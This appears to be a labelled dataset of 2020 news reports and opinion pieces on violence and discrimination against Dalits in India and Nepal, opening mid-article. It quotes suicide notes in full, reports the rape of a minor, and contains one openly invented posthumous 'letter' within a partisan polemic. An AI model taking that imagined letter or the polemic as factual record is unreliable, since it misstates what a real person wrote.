see my India being ruined, it is with a feeble hope that I write to you at such a grim moment. Well, I am off to NIA custody and do not know when I shall be able to talk to you again. However, I earnestly hope that you will speak out before your turn comes,” he wrote. Teltumbde and other activists were initially booked by the Pune Police following violence that erupted at Koregaon-Bhima there. According to police, the activists made inflammatory speeches and provocative statements at the Elgar Parishad meet held in Pune on December 31, 2017, which triggered violence the next day. The police also said these activists were active members of banned Maoist groups. The case was later transferred to the NIA. Teltumbde and Navlakha were given interim protection by the Bombay High Court while their pre-arrest bail pleas were being heard. After the high court rejected their applications, the duo approached the Supreme Court. On March 17, the apex court rejected their pleas and directed them to surrender within three weeks. On April 9, the Supreme Court granted the duo another week to surrender by way of last chance.

1,"By Nasreen Jehan On January 17, 2016, a dead body was found in University of Hyderabad India. Dead body was of a Voice — A voice for Dalits. Leader of Ambedkar Students Association Rohith Vemula who was forced to commit suicide. He was not the first or the last Dalit student who was murdered but he was first who left “told stories” in a world where Dalit are murdered with “untold stories”. Police believe that he had committed suicide while his friends and students of university believe that it was a “systematic murder” and an “engineered suicide” because he was so marginalized and compelled by circumstances developed by university administration around him that he might have committed suicide. However, majority of his close friends believe he could not commit suicide and case needs deep investigation. This case was stored in cold-storage of Indian legal system. According to his close friends he was one of the activists on hunger strike from January 16 on the campus against the illegal and demonstrably false case framed against them by the administration. Rohith went out of the tent to a hostel and hanged himself, leaving a suicide note. It was at the behest of BJP leader Bandaru Datttreya who started persecuting Dalit students and scholars. There are several Dalit who were either denied higher education or were dumped in Unemployment lot after receiving higher education. This is the fate of low-caste people in India but such treatment of humans by Indian society never gets attention of international media which sees India with a different lenses—lenses of a country having huge economy and high trade linkages with western and middle eastern countries. Rohith was the man of action while most of the rest of low-caste Hindus are either taking a break or retired. Political paradigm on central universities in Hindutva persecutes who talk about discrimination against Muslims and worked to bring Dalits and Muslims together to combat it. Rohith so-called suicide note exposes those facts which are hidden behind heavy curtains Indian media and establishment throw on the eyes of international Right Organisations and foreign media. 251-days lockdown in Indian Occupied Kashmir is another fact which is not seen by the world. Whatever happened in Delhi massacre recently and what was happened in Jamia and NJU universities is forgotten. Let us have a look to letter Rohith left to know how Indian establishment persecutes Muslims and Dalits. Rohith Vemula Here is his Letter: Good morning,I would not be around when you read this letter. Don’t get angry on me. I know some of you truly cared for me, loved me and treated me very well. I have no complaints on anyone. It was always with myself I had problems. I feel a growing gap between my soul and my body. And I have become a monster. I always wanted to be a writer. A writer of science, like Carl Sagan. At last, this is the only letter I am getting to write.I loved Science, Stars, Nature, but then I loved people without knowing that people have long since divorced from nature. Our feelings are second handed. Our love is constructed. Our beliefs colored. Our originality valid through artificial art. It has become truly difficult to love without getting hurt.The value of a man was reduced to his immediate identity and nearest possibility. To a vote. To a number. To a thing. Never was a man treated as a mind. As a glorious thing made up of star dust. In very field, in studies, in streets, in politics, and in dying and living. I am writing this kind of letter for the first time. My first time of a final letter. Forgive me if I fail to make sense.My birth is my fatal accident. I can never recover from my childhood loneliness. The unappreciated child from my past.May be I was wrong, all the while, in understanding world. In understanding love, pain, life, death. There was no urgency. But I always was rushing. Desperate to start a life. All the while, some people, for them, life itself is curse. I am not hurt at this moment. I am not sad. I am just empty. Unconcerned about myself. That’s pathetic. And that’s why I am doing this.People may dub me as a coward. And selfish, or stupid once I am gone. I am not bothered about what I am called. I don’t believe in after-death stories, ghosts, or spirits. If there is anything at all I believe, I believe that I can travel to the stars. And know about the other worlds. If you, who is reading this letter can do anything for me, I have to get 7 months of my fellowship, one lakh and seventy-five thousand rupees. Please see to it that my family is paid that. I have to give some 40 thousand to Ramji. He never asked them back. But please pay that to him from that.Let my funeral be silent and smooth. Behave like I just appeared and gone. Do not shed tears for me. Know that I am happy dead than being alive. “From shadows to the stars.” To ASA family, sorry for disappointing all of you. You loved me very much. I wish all the very best for the future. For one last time, Jai Bheem  Would you like to read another letter which is sent by Rohith from the world he lives now? Let me share this letter with you also: I was never a coward. I was follower of Ambedkar and I was a Comrade. I was grown up from a poor background, in a home at Savitribhai Nagar in Guntur where my mother brought me up by tailoring, which she continued till I got admission in Ph.D. I did not get admission in Ph.D in one attempt. I was hurdled to get PhD admission twice just because of the oppressive attitudes of bureaucracy and brahminical mindsets of a few, even while having an exceptional double JRF in hand. I knew brahminical mindsets would not allow me to get degree and I was ready to sacrifice my life because I know I have to sacrifice for those Dalits and Muslims who have dreams in their eyes. Will India be a normal country? I am going but you who love me have to work hard—stand against BJP kind of mindset otherwise this country would become hell for 1.25 billion people including high caste Hindus also because hate never allows anybody to flourish—irrespective of his caste, colour and social background. I felt pain when my mother was dragged in Delhi but media kept silent. My mother went to India Gate to pay respects to me (Rohith), in a candle light procession. She was dragged by the police and later detained by the Delhi police along with others. The news was barely covered by the mainstream media. One wonders why such a serious incident was looked over by the media when my mother was being humiliated? My mother wants to ask you (Nation) why did me and other Dalit students got branded as an anti-national in the first place? Do we (Dalits and low-caste Hindus and Muslims have no right on education? If yes, why we are not allowed higher education? I want to ask authorities of United Nations Educational, Scientific and Cultural Organization (UNESCO) that you are responsible for equal rights for education to all and believe that you work for filling gaps between poor and rich, between powerful and powerless but you do not see what India does to its poor strata of society? Did you write any letter to Indian authorities on my systematic murder? Did you ask Indian education system why I and thousands like me are persecute in Indian educational system? I know you did not write and you will not because India is a strong economy and UN stands for India always—from Kashmir issue to Assam and from Assam to Manipur. I give a damn to all of you— You UN or UNESCO. You stand only for powerful and crush powerless people. Thank you for reading my letter. Jai Bheem Editor Note: This video can give an insight how Dalit students feel in India  "
1," This pandemic (COVID -19) situation is hitting the marginalized poor the worst because of their inherent vulnerable condition. The entire country is being converted to a police state with an absolute power exercised by police to mercilessly beat anyone on street. It is mostly the poor and marginalized on the streets who are being harassed and humiliated. The socially and economically privileged groups with, advantageous access, to all kinds of opportunities are relatively in a better-off position to face the crisis. Religious fanatics and privileged castes brigade continue to preach their kinds of congenital hegemonic binary everywhere mainly governance, media, academics, CSOs which have been generalizing the victimization without differentiation. But when most daily wage earners and other poor are being asked to stay at home, along with to maintain physical distancing, the governing system has forgotten they have been struggling for a living with inadequate basic amenities, water and sanitation, and are surviving in a mere small living space called as home for the whole three generation family staying under the common roof. Let’s look at Dalit hamlets in rural villages of Odisha and the status of basic amenities in the context of COVID19 and implementation of measures such as hand wash and physical distancing, and lockdown at home, etc. Continued practices of Untouchability and atrocities in rural areas: In spite of protective legislations against practices of untouchability and atrocities such as PCR Act 1955 and POA Act 1989.In the year 2018, the state has witnessed 1810 reported cases of atrocities against SCs ranging from rape, assault on women and children, murder, rioting, attempt to commit murder, hurt, house burning, arson, physical assault, and many more forms of heinous crime along with unabated practices of untouchability in many forms in rural villages. The National Records Bureau report for the year 2018 says that 10000 numbers of atrocities cases have been pending for trial, in different courts of the state, where as the conviction rate was only 3 percent. Non official survey revealed that about 200 different forms of untouchability practice have been existing in rural villages. It includes residential segregation, seating separately in Aganwadi centers, during mid-day meal in schools, separate hostels for students, separate bathing place, drinking water sources, cremation ground, two glass system in tea stalls and eateries, not allowed in saloons and public places, temples, honour killing to prevent inter caste marriage and many more. Persistent Poverty, unemployment and distress migration: The incidence of poverty is very high among Scheduled Castes .Odisha Economic Survey 2018 reports that 42 percent of Scheduled Caste households are under BPL mark, which is extremely high than the state average of 33 percent( 2011-12). As 2011 SECC census published in 2015 only 0.80 SCs households were in salaried jobs in private sector. It is not just about the income or dignified employment but most Dalit households also lack of productive assets such as Land, access to formal credit and quality education. Agriculture census and SECC 2011 very well established the fact that a vast majority of SCs population are landless and without Record of Rights (ROR) over their homestead land in possession. Though nearly 85 percent SCs rural household depend on agriculture for livelihood as sharecroppers and agricultural workers. Agriculture in Odisha is seasonal in nature due to lack of irrigation facilities. And also has been more prone to regular natural calamities such as flood, cyclone, erratic rainfall, drought etc. having a direct bearing over the life of the rural scheduled caste families. Agricultural workers get the lowest paid minimum wage because they are officially being treated as unskilled workers. There has been lack of official census about social composition of agricultural workers and there has been no social security measures for these section of rural workers in spite of social security laws being enacted for rural unorganized sector workers since 2008. The seasonal migration among workers within the state and outside the state is very high due to lack of employment as well as low wage rate along with practices of social discrimination. In the absence of organizations of agricultural workers and share croppers, the protagonist of farmers organizations in the state never ponder over the issues of share croppers and agriculture workers as all-encompassing of agriculture sector as whole and for its inclusive development. Basic amenities: Basic amenities are bare necessities for a dignified life and healthy living. It includes a piece of land of own for an identity to securely construct a house , safe drinking water, toilet, electricity, all weather linking road from home to main road etc. The Constitution of India under Article 19 (e) says that ‘all citizens shall have right to reside and settle in any part of the territory of India and rights to shelter is a fundamental right’. Under Article 21 Right to Life is a natural human right and the Constitution protects Right to Life and livelihood and Right to Health as an integral part of Right to Life. A recent survey in Odisha found that out of about 6000 SCs household covered under the survey in 8 Tahasils of 5 districts, 60% of the household are landless without any homestead land. They have been staying over since generations on so called Govt. land, land belongs to ex -Jamindars, former kings, CPR of the village, forest land, on the bank of village pond , river, irrigation canal, roads and amidst of Paddy fields, coconut stretches, etc. Homestead land is central to access all other facilities of basic amenities and for implementation of any programme of basic amenities land is a basic requirement. Social Activists who have been instrumental in filing claims for homestead land under OGLS Act 1972 in many places of the state in opinion that their experience shows more than 90% of the applications have been pending without proper inquiry since years together without any time frame for disposal of these application of genuine landless poor. Many of the landless poor daily wage earners are being routinely visiting Tahsail and RI offices but getting harassed with delay in getting their entitlement rights. Along with homestead land it is found that many of the Dalit hamlets have no all-weather linking road connecting to the main road and they have also no cremation ground and other common place for community activities. As they have been deprived up getting access to land-based common property resources of village due to practices of untouchability though it has been prevented under PCR Act and POA Act but the ground reality have not been changed yet. Many of the hamlets have lack of all-weather linking road and in spite of repeated attempts by the community there has been no action by the local Govt. authorities. In many places the hamlets are surrounded by private lands owned by dominant caste villagers and usually they do not allow Dalit to trespass over their private land and many places the filed divider line (HIDA, local name) is the main link of communication from hamlet to main road. Housing: The Dalit habitations in the state of Odisha are very well demarcated by its look from outside. Most of the houses are single room and without any separate facility such as kitchen, store room, drawing room, bed room and bath room etc. NSS 76th round report 2018 revealed that 59 percent of rural household living in Puuca houses, 23 percent in semi-puuca, and 16 percent in Kacha houses in the state. It is unfortunate that for centuries together a majority chunk of Dalit population is being forced to live in the most undignified life .The housing policy of Govt. has not taken care of basic human needs and plan in a very discriminatory manner targeting the marginalized section of our society. There are two major housing schemes one by central Govt. that is PMAY (Rural) with state share and the other is Biju Pucca Ghara Yojana and for mining area and construction workers and MO Kudia. A survey found that many of the potential beneficiaries are deprived up getting house under such schemes because they have no land and there has been huge nepotism in the selection of beneficiaries at panchayat level. The houses have been not completed in time and there are number of houses being half made and remain incomplete due to administrative issues. Drinking water: The census 2011 only 7.5 percent of rural household had access to tap water where as it was 30.8 percent at national level. National Rural Drinking Water Supply Programme web site says only 26 percent of habitation in Odisha have piped water supply as on April 2018. Survey of 200 hamlets shows 7 percent of households have access to piped water facility where as 58 percent depend on tube well and 8 percent on wells and 8 percent on boring . Out of total tube well only 1 percent have solar tube well. About 1/3 of the hamlets have been facing serious water crisis in summer where mostly the Dalit women in summer still go to river beds and Nalas and other local ‘water’ sources to dig small pits to get water. Every day women have to walk and spend their quality time to fetch water, this has been a regular exercise in summer in a majority of the hamlets. In few hamlets the quality of water is not hygienic for consumption because of arsenic and iron contains. Dalit women in multi caste villages face discrimination while collecting water from common sources, a normalized practice for them now. In some places, the caste people wash the tube well used by Dalit women or sometimes Dalit women have to call some caste women to help get the water without touching the tube well. Toilet: Under the Swachha Bharat Mission (Gramin) the state of Odisha has been declared as open defecation free but the reality is something else in the context of Dalit. Sanitation is a major issue of Dalit as a majority of the household depend on open defecation in the absence of toilet with water facility. Dalit families face social humiliation while going out for open defecation in private lands of upper caste and also in common property resources of the village. Mostly women prefer to go in the evening or early before sunrise to avoid the public eyes. Ina survey we found 57 percent of the household have toilets constructed under Govt. scheme and rest 43 percent have no toilet but majority of the household having toilets are not using it. Women, children and elderly people have been facing an extremely difficult situation in their day to life. It has ramification over family and social life, personal health and hygiene and its ultimate impact on living and working condition and economy. Electricity: Electricity is a basic human need and fundamental to socio-economic development. It is reported that 99.64 percent of the inhabited revenue village have been electrified by the end of 31st March 2019. But connected to the village does not mean connected to Dalit hamlets. Our survey shows about 5 percent of household have no connection at all. Discrimination in access to services and minimal presence as service provider: Ineffective implementation of affirmative action in education, service sector and other areas have deprived the SCs of the state form their participation in different sector of the state. It is being observed that scope of petty business is very limited due to hostile and discriminatory social environment in caste ridden rural Odisha. Students and employees from the Dalit community have been facing social discrimination in schools and offices and being socially segregated because of their low caste identity. The hostile, discriminatory and violence casteist attitude of the dominant privileged castes of the state and their socio-cultural hegemony continue unabated in the absence of progressive social movements and minimal enforcement of socially protective legislations. Public offices are getting communalized in religious line by celebrating religious functions in schools, colleges, universities and Govt. offices, police stations etc. There has been no attempt to socially secularize and democratize, at least, the public places build at the cost of state funding. Dalit people are not treated with dignity in local Govt. offices such as Police station, Tahasils, RI offices, Block offices, Panchyat office and Banks in rural areas. Very often they face extortion and negligence in dealing while they make any claim for rights and entitlements under different Govt. laws and provisions. There is no policy of social inclusiveness in recruitment of rural service providers such as Aganwadi and mid-day meal cooks and contractual appointments for facilitation of entitlements and services at panchyat level. The Dalit people very often face discrimination in getting access to services such as PDS and ANM centre in the village. There are 1.45 lakh cook cum helpers and 29 900 women self-help groups are engaged in MDM scheme operational in the state since 1995. There are thousands of contractual jobs being created in rural areas to facilitate effective service delivery system where SCs have almost very insignificant presence. This is denial of Right to participation and realization of basic human rights and entitlements for development. The said situation is just a tip of the iceberg but in the given conditions how will the poor marginalized section face the current situation. The very temporary relief measures of Govt. is not addressing any issues rather it will make them further vulnerable from bad to worst. It will make them further poorer. There are reports of discrimination in relief and quarantine centers and organized attack by police and local administration in Dalit hamlets. Dalit volunteers are not allowed to serve cook foods while Dalits are also served from distance by panchyat officials and so called social workers. While Humanitarian aid agencies, groups and individuals are advertising their great charity by projecting the helplessness of poor on street who are making large queue with begging bowel for food of the day. But in normal times they have no role in addressing the structural issues of huge inequality rather issues of different marginalized sections are sometimes seen as sectarian and disjointed from larger societal prospective. Why people from certain specific occupations are selectively praised for their duty as fighters as if people in others occupations are betraying the fight or they do not have any role at all. This media developed binaries also identifies media itself as one of the fighter. As if they are not part of this society and suddenly enter from some other planet as saviors. This is denial of collective spirit and responsibility of a nation and all its citizens who all have been contributing in different forms. It also seems that addressing pandemic is an additional constitutional responsibility of Govt. and people need to praise the leaders of Govt. because they are doing as extra constitutional job out of favor to the people of this country. People rating the performances of states and centre and making comparisons attaching political ideology and affiliations. Above all whose power and money it is? Does it belong to the people of this country or political parties and media have built this power and resources? Some of the political protests have become exhibitory routine work just to feel one’s own presence without any substantial impact and consequences and also large protest are disconnected from the larger politics of change of structural issues and become more event or dispute centric and in many cases serve a section with vested interest without larger social perspective.

Teltumbde was arrested by the NIA earlier in the day after he surrendered before it following the Supreme Court’s directives. He is the grandson-in-law of Dalit icon Dr BR Ambedkar, whose 129th birth anniversary is being observed on Tuesday. Civil rights activist Gautam Navlakha, a co-accused in the case, also surrendered before the NIA in Delhi. His anticipatory bail plea was also rejected by the apex court. Navlakha was to be produced before special NIA court here through video conference, but the court said since he had surrendered in Delhi, he will have to be produced before a court there first. An NIA lawyer said he would be produced before a court in the national capital for seeking his transit remand after which he will be brought to Mumbai. Teltumbde reached the NIA office here in the afternoon with his wife Rama Teltumbde and brother-in-law and Dalit leader Prakash Ambedkar and surrendered. In the court, the NIA sought ten-day custody of Teltumbde, but judge AT Wankhede granted it remand till only April 18. The Supreme Court on March 17 this year had rejected pre-arrest bail pleas of Anand Teltumbde and Navlakha, and directed them to surrender before the investigating agency. Teltumbde, Navlakha and nine other civil liberties activists have been booked under the stringent provisions of Unlawful Activities Prevention Act (UAPA) for having alleged Maoist links and conspiring to overthrow the government. The activists were booked initially by Pune police following violence that erupted at Koregaon-Bhima in the district. According to police, the activists made inflammatory speeches and provocative statements at the Elgar Parishad meet held in Pune on December 31, 2017, which triggered violence the next day during 200th commemoration of the battle of Bhima Koregaon. The police also said these activists were active members of banned Maoist groups. The case was later transferred to NIA. PTI  Tribune Shorts A - A + What do you think?

1,"(Eds: Adding word in headline) Gorakhpur, Apr 13 (PTI) An FIR was lodged against a man in Uttar Pradesh's Kushinagar district on Monday for allegedly refusing to eat food cooked by a Dalit village head at a quarantine centre, police said. The man was identified as Seraj Ahmad, a native of Bhujouli Khurd village of the district. He and four others are lodged at a quarantine centre set up in a primary school in the village, they said. Ahmad returned to the village from Delhi on March 29 and has been in quarantine at the centre, the police said. On April 10, the village head, Lilawati Devi, who is a Dalit, went to the quarantine centre and prepared food for the five people lodged there as the cook was absent. However, Ahmad refused to have the food cooked by her, they said. Later, Devi informed Sub-Divisional Magistrate Deshdeepak Singh and Block Development Officer Ramakant about the incident. She lodged a police complaint on Sunday, they added. Station House Officer (SHO) Khadda police station R K Yadav said a case has been filed against Ahmad under the Scheduled Caste and Scheduled Tribe (Prevention of Atrocities) Act. BJP MLA Vijay Dubey visited Devi's house on Sunday and asked her to serve him food cooked by her. He said untouchability is a social evil and it can't be tolerated at any cost.

1,"POSTED ON APRIL 2, 2020 A Dalit youth committed suicide on Wednesday after he was allegedly beaten up by the Uttar Pradesh police for breaking #quarantine rule As the total number of the people tested positive for Corona in Uttar Pradesh (UP) rose to 335, in first such case all over the country, a Dalit youth committed suicide on Wednesday after he was allegedly beaten up by the UP police for allegedly breaking quarantine rule. A resident of Fariya Pipariya village which falls in Lakhimpur district, the Dalit youth, Roshan Lal worked as a daily wage worker in Gurugam. He had returned to his village on Sunday, March 29, six days after the Modi government announced nation wide lockdown. Since then he was living in the school of the village after the local administration had put him in quarantine. In a recorded audio clip, which Roshan Lal forwarded to his friend and family members on WhatsApp minutes before he committed suicide, he can be heard screaming and narrating the story of torture and humiliation in a very feeble voice. “Friends, if someone does not believe then take off my pants and see. You will not find anything but blood-clotting all over my back. I am going to commit suicide after this as I do not want to live anymore. My hand has been broken. What will I do now in my life?” says the Dalit youth in the recorded clip. “I want to tell you, if after my death someone says that I was tested Covid-19 positive, that is wrong. I was tested negative and I have the result also. I want to end my life. But I want that action must be taken against Anoop Kumar Singh. Anoop Kumar has done grave injustice. I am feeling very helpless…,” adds Roshan Lal. Coronavirus: Dalit youth kills self after being tortured by Uttar Pradesh police for breaking quarantine rule Roshan Lal recorded three audio messages minutes before he embraced death, claimed his family. In another audio-clip he can be heard saying, “Despite this, nobody came forward to help me that is why I am taking this extreme step.” Expressing his last wish Roshan Lal said, “I have a saving of Rs 80 thousand in PNB bank, that should be given to my mother. There is another saving of Rs 20 thousand in Allahabad Bank, that too be given to my mother.” Referring to the contractor under which Roshan Lal worked in Gurgaon, he said in the recorded message that “the contractor owes me Rs 25 thousand, that also should be given to my mother”. Saying that “strictest action must be taken against Anoop Kumar Singh”, Roshan Lal says, “He has beaten me mercilessly…you will not find anything but blood clotting on all over my back. I am committing suicide because of this only.” In another 1.41-second audio clip, Roshan Lal can be heard introducing himself, before he took the extreme step. “Hello Namaskar friends, my name is Roshan Lal. I am very upset today. My only fault is that I have stepped out (of the school where he was put in quarantine) to get flour because we did not have anything at my home to eat. A policeman named Anoop Singh has thrashed me so badly that my right hand has stopped working. Perhaps, it is broken now. Don’t ask how helpless I am feeling right now.” After Roshan Lal committed suicide, his family members tried to lodge an FIR against constable Anoop Kumar, but the UP police refused. Roshan Lal’s family has demanded action against constable Anoop Singh. This is the fourth case of suicide due to the scare and panic caused by the Corona outbreak and ensuing lockdown. A young man had committed suicide on Tuesday in Kanpur by hanging himself because he feared that he was suffering from Coronavirus.

1,"Lucknow, April 10 : BSP president Mayawati has demanded stern action against Subrat Pathak, the BJP MP from Kannauj, for his involvement in a case of assault against a Dalit tehsildar. In a statement, Mayawati has urged UP chief minister Yogi Adityanath to intervene in the matter and ensure action against the accused MP. The BJP MP Subrat Pathak, accompanied by 20 to 25 men, had allegedly broken into the house of the tehsildar, Arvind Kumar, on Monday and had assaulted him over the distribution of ration to people mentioned in a list sent by him. Mayawati said, ""The incident from Kannauj where an honest Dalit tehsildar was beaten by a BJP MP is shameful. What is more concerning is that he is still roaming scot-free instead of going to jail."" Demanding that Adityanath look into the matter, she wrote that recurrence of such incidents must be stopped and Dalits should not be attacked in this manner. ""Stern action is needed against the MP. This is what the BSP demands,"" she stated. A case has been registered against Pathak and 25 unidentified men, and around 10 vehicles have been seized from the site of the assault. The tehsildar had earlier said that he had explained to the MP over the phone that other senior officials were looking into the distribution of ration to people mentioned in his list. However, despite the explanation, the lawmaker abused and threatened him. Pathak's supporters have denied the incident, saying that they had gone only to discuss some development projects with Kumar. A report in the matter has been filed with the District Magistrate and the Superintendent of Police."

1,"Nainital: A recent incident from Nainital has exposed that casteism still exists in the society. A 23-year-old youth allegedly refused to eat food prepared by a Dalit cook. The youth, staying in quarantine refused to consume anything touched by the Dalit cook. The 23-year-old youth was identified as Dinesh Chandra Milkani. The accused was booked after the pradhan of Bhumka village filed a complaint against him. Dinesh, his nephew and three other persons have been staying in quarantine at a government primary school in Bhumka village since May 15. The cook was identified as Bhawani Devi. Bhawani Devi is a member of the Dalit community. Devi had been preparing meals for all the persons in quarantine. On May 15, she prepared food for all the quarantined persons. While on one side, all the people ate the food, Dinesh refused to consume it. Dinesh allegedly said that his food will come from home. Initially, Devi did not feel discriminated against. However, Devi learned the reality when Dinesh refused to drink water touched by her. When village pradhan Mukesh Chandra Baudhh learned about Dinesh's behaviour, he confronted the 23-year-old youth. Mukesh told The Times of India, ""Milkani said that his food will be delivered by his family. But, when we asked him to drink water touched by Devi, he refused again. "" Dinesh said that the incident is a case of caste discrimination, therefore, he took the decision of filing a complaint with the authorities. On being asked about the incident, Dinesh said that he refused to eat food as he always eats home-cooked food. He denied the allegations made against him. Dinesh claimed that he does not eat food prepared by other persons as he gets possessed by the deity. The 23-year-old youth has been booked under relevant sections of the Indian Penal Code (IPC) and the SC/ST Act. The content you are trying to watch is not available in your region"

Despite the country's multiculturalism, minority groups in Nepal — known as Dalits or untouchables — are often subjected to various forms of discrimination, which ranges from hate speech and abuse to rape and murder. Most recently, on May 24, two Dalit boys, Nawaraj Bishwakarama (BK) and Tika Ram Sunar, were found dead on the banks of the Bheri river in the Jajarkot district of Southern Nepal. Three other bodies of Ganesh Budha, Sandip BK and Lokendra Sunar were found later and another youngster, Govinda Shahi is still missing. An inter-caste love relationship was deemed to be the major reason for their tragic deaths. Nawaraj, a 21-year-old from Jajarkot who loved playing sports and wanted to join the police force, was born into a Dalit family. He fell in love with Sushma Malla, an upper-caste, 17-year-old girl. Once her family learned about their relationship, Nawaraj and his family received frequent warnings to keep away from her, and on one occasion, he was reported to the police. Sushma's family wanted to marry her off with someone from her own caste, so she reportedly asked Nawaraj to rescue her before they did. On the night of May 23, Nawaraj — accompanied by 18 friends — headed to Sushma's village of Soti, in the Rukum district, so that the two could elope. Upon their arrival, they were chased, stoned and beaten. In an attempt to save themselves, some of them jumped into the nearby river and managed to escape, but Nawaraj and five of his friends didn’t survive the fall. Five bodies have been recovered so far, one still missing, and other members of the group were handed over to the police and were released later. One survivor told to media: Nawaraj was badly beaten up by the crowd. All his body parts, including his head, were seriously injured. He wasn't able to move and he was thrown into the river, he was not in a condition to even swim [so he] could survive. After the incident, police arrested Dambar Bahadur Malla, Sushma's father and ward chair of the local municipality, along with fifteen others in connection with the incident. Various human rights organisations and Dalit leaders have been pressuring the government to take immediate action on the case and provide justice to the victims’ families:  Although protests and discussions are ongoing in different parts of the country, many fear that this case will soon be forgotten, like so many others in the past. One Twitter user explained: रुकुमको घटना एउटा जघन्य अपराध हो।नवराज बिक संगै गएका भागेर ज्यान बचाएका २ साथीहरुको बयान सुन्दा आङ जिरिङ्ग हुन्छ।उनका साथीहरूको कुरा सुनिसकेपछि,दलित भएकै कारण नवराजको ज्यान लिइएको बुझ्न कठिन हुने छैन।तर्क/कुतर्कले नबराज र साथीहरूको जीवन अब फिर्ता हुने छैन।https://t.co/gtxd78MgDx — Rabi Lamich2ane (@hamrorabi) May 26, 2020 Rukum's incident is a heinous crime. It is heartbreaking to hear the statements of two friends who ran away with Nawaraj BK, who escaped from the crowd [in order] to save their own lives. After listening to his friends, it will not be difficult to understand that Nawaraj was killed because he was a Dalit. The lives of Nawaraj and his friends will not be returned by any logic/gossip. Despite laws to the contrary, caste-based discrimination is a festering sore in Nepalese society, as Dalits face continuous social prejudice and violence. On May 23, 2020, one day after a 12-year-old Dalit girl from the western Rupandehi district was forced to marry her upper-caste rapist, she was found hanging from a tree. Preliminary police investigations suggest that she had been raped and murdered. Every year in Nepal, many cases of inter-caste marriage are reported. In 2016, for example, 18-year-old Ajit Mijar married his upper-caste girlfriend Kalpana Parajuli. Five days later, his body was found hanging. By the time his family arrived on the scene, the police had already buried him, and — without any investigation — declared his death a suicide. According to the Article 18 of Nepal's Constitution, caste-based discrimination is criminalised — but while the country announced itself as an untouchability-free nation in 2006, the Act only came into effect in 2011 and is not enforced. Most cases of caste-based discrimination are swept under the carpet, the police often fail to investigate reports of violence against Dalits, and perpetrators often go unreported or unpunished. Journalist Ajay Das tweeted: संविधानबाट ‘दलित’ शब्द हटाए विभेद अाफै हट्छ भनेर कुतर्क गर्ने केही महान विचारकहरूले ‘गरिबी’ शब्द शब्दकाेशबाट हटाए विपन्नता पनि हट्छ र समृद्धि अाउँछ भनेर तर्क गरे अनाैठाे नमाने हुन्छ। #Nepal #Dalit — Ajay Das (@ajaydas09) May 29, 2020 Some great thinkers, who speculate that removing the word ‘Dalit’ from the constitution will eliminate discrimination itself, argue that removing the word ‘poverty’ from the vocabulary will also remove poverty and bring prosperity. Entrepreneur Shiwani Neupane challenged the media not to shun their responsibility: I hope the Nepali media will continue to follow on the story of lynching of innocent Dalit boys in Nepal till justice is served. There is no space for impunity and that should be clear to everyone. I beg the media to not set this aside and move to the next news cycle. Please. — Shiwani Neupane (@ShiwaniNeupane) May 30, 2020 Dalits remain one of the most underprivileged groups in Nepal, prompting the successful social entrepreneur and human rights activist Bishnu Maya Pariyar, who came from a low-caste family, to return to Nepal and produce a documentary, “Untouchable”, on the discrimination that she faced growing up:  The caste system is categorised in a hierarchical arrangement, with Brahmins (priests) at the top, followed by Kshatriya (warriors and princes), Vaishya (farmers and artisans), and Shudra (shoemakers, tailors, metal workers, and servants). A fifth element varna categorises those deemed to be entirely outside its scope, including tribal people and untouchables such as Dalits. According to a comprehensive 2011 census report, Dalits made up 13.6 per cent of the total population (approximately 3.6 million people), but some researchers estimate that the number could be more. The census is conducted every 10 years in Nepal; the government is currently preparing for new census data collection. The caste system has played an influential role in Nepal’s social, economic, and political landscape. Most higher caste people are in positions of leadership, while Dalits are held back economically, socially, culturally and politically. In some parts of Nepal, Dalits are still not allowed to use public taps, temples, or shops. Though such incidents — which range from social exclusion to murder — are still prevalent nationwide, they are usually felt most strongly in conservative regions like Western Nepal, although the cities exhibit the underlying prejudice in subtler ways.

1,"A 13-year-old scheduled caste girl is 17-week pregnant after she was gang-raped by three men of her village in Bharatpur four months ago, said police on Monday. Doctors found out about her pregnancy when the girl complained of abdominal pain and was taken to hospital on Saturday. The girl’s parents registered a case against the three on Monday. According to the FIR, the three men dragged the girl to a mustard field in a village under the Kaman police station about four months ago. They gagged her and gang-raped her there. The girl’s mother said the girl complained of abdominal pain and was taken to a private hospital in Kaman on May 23, where doctors found through ultrasound examination that she was pregnant for 17 weeks. After this, the girl told her parents about the sexual assault, police said. She said the three have raped her multiple times in the last four months. For Coronavirus Live Updates Kaman police station in-charge Dharmesh Dayma said a case has been registered against the three named accused, who are absconding. “Her medical examination was done today; the report will come on Tuesday. We will also take her to a magistrate on Tuesday for her statement under section 164 of the CrPC,” said Kaman circle officer Devendra Singh Rajawat, the investigating officer in the case.

1,"As the central and state governments rush to conjure a business-friendly climate in this time of coronavirus, Shankar V. writes that a ‘self-reliant India’ cannot be built on foreign capital – certainly not by scrapping labour laws in a bid to attract foreign capital Narendra Modi-led RSS-BJP government has declared a veritable war on the working class of the country. Prime Minister Modi warned in his televised address that people should be ready for “bold reforms”. BJP-led state governments of Uttar Pradesh, Madhya Pradesh and Gujarat have already either scrapped or rendered labour laws totally ineffective. The BJP government has cunningly chosen this critical period of medical emergency to push through its anti-people measures under the garb of COVID-19. The anti-worker measures would have been confronted with massive resistance from workers but for the lockdown and the Epidemics and Disaster Management Act in force.  A “self-reliant India” cannot be built on foreign capital – certainly not by scrapping labour laws in a bid to attract foreign capital. For Prime Minister Modi, self-reliance is only rhetoric and doesn’t really mean self-reliance of the country and its people. He is pushing workers and toilers into slavery while making India subservient to imperialist powers. Early this year, while several countries were trying to rein in COVID-19, the government was busy orchestrating violence against anti-CAA, NRC, NPR protestors, particularly Muslims in Delhi. When the virus struck the country, the Tablighi Jamaat was blamed for the spread of the virus, thus portraying Muslims as its carriers. Now several of the Jamaat members have been arrested. The corporate communal government, true to its form, painted the Muslims as the enemy to conceal its own failures in fighting COVID-19. The first and primary victims of the unplanned and abrupt lockdown announced by Prime Minister Modi were the crores of migrant labourers. They were stranded all over the country without food, shelter or money. An overwhelming majority of migrant labourers are poor and hail from the most downtrodden social sections, mostly Dalits, other Backwards and Adivasis, on the lowest rungs of society. The government is now forcing the migrant labourers to work under semi-bonded conditions by slowing down evacuation – reducing the number of trains to their home states and by increasing fares. A major section of frontline workers in the effort to contain the epidemic, particularly ASHA (Accredited Social Health Activist) workers, Anganwadi workers, mid-day meal workers, and housekeeping and sanitation workers are offered only empty rhetoric – they are not even paid minimum wages, let alone bonuses. Again, most of them are Dalits, Backwards and Adivasis. As the Modi government seeks to protect corporate monopoly capital, it is sacrificing the working class. It is hurriedly preparing to enforce anti-labour codes through backdoor methods, without any tripartite or bipartite discussions and by violating ILO (International Labour Organization) conventions, all in the name of coronavirus. 